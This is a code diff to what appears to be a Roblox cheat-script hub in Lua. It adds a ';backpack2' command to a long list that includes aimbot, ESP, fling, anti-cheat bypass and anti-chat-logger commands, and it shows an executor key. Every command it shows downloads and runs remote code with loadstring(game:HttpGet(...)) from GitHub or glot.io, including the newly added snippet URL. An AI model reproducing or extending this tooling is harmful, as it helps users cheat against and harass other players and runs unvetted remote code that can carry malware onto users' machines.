@@ -263,7 +263,7 @@ local commands = {
     ";tfling2", ";bp1", ";bp2", ";bp3", ";bp4", ";bp5", ";bp6", ";bp7", ";bhtool", ";mvtool", ";grtool", ";tel1", ";tel2", ";glios", ";cmds", ";hth",
     ";zomb", ";search", ";knpc", ";jerk", ";punch", ";invis2", ";invis", ";invis3", ";tel3", ";roa", ";akp1", ";akp2", ";akp3", ";keyb3", ";keyb4", ";cvb", ";ska", ";reach", ";reach2", ";hitbox", ";aimbot", ";cfling", ";finger", ";spdmtr",
     ";prox", ";rochips", ";fc1", ";fc2", ";synapse", ";synapse2", ";krnl", ";krnlk", ";bypass", ";fc3", ";rp", ";rp2", ";srp", ";srp2", ";tictactoe", ";illus", ";toolgui", ";keyb", ";cspy", ";slock", ";wibtt", ";acl", ";crouch", ";srp3", ";srp4", ";tptool", ";ngp", ";fling", ";esp", ";radar", ";OCDtool", ";fc4",
-    ";rc7", ";cunc", ";keyb2", ";na3", ";backpack",
+    ";rc7", ";cunc", ";keyb2", ";na3", ";backpack", ";backpack2",
     ";krnlk (key: 9X1L9ZPAXN4)"
 }
 
@@ -357,6 +357,8 @@ executeButton.MouseButton1Click:Connect(function()
         loadstring(game:HttpGet("https://github.com/ltseverydayyou/Nameless-Admin/raw/refs/heads/main/Source.lua"))()
     elseif codeToExecute == ";backpack" then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/refs/heads/main/mobileBACKPACK.lua"))()
+    elseif codeToExecute == ";backpack2" then
+        loadstring(game:HttpGet("https://glot.io/snippets/h9u1v79k2y/raw/CusInv.lua"))()
     elseif codeToExecute == ";acl" then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua"))()
     elseif codeToExecute == ";srp4" then
